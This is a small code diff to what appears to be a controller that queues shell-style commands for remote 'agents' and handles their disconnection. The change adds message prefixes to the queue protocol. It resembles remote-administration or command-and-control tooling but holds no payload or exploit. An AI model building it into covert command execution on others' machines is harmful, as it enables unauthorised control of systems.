@@ -152,7 +152,7 @@ eventEmitter.on('agent', (action, ...args) => {
     const command = args.slice(1).join(' ');
 
     console.log(`Executing ${command} on agent ${id}`);
-    agents[id].commands.push(command);
+    agents[id].commands.push(`command&${command}`);
   } else if (action === "disconnect") {
     if (args.length === 0) {
       console.log('Usage: agent cmd <ID> <command>');
@@ -166,6 +166,7 @@ eventEmitter.on('agent', (action, ...args) => {
     }
 
     console.log(`Disconnecting agent with ID ${id}`);
+    agents[id].commands.push(`disconnect&${id}`);
   }
 });
 
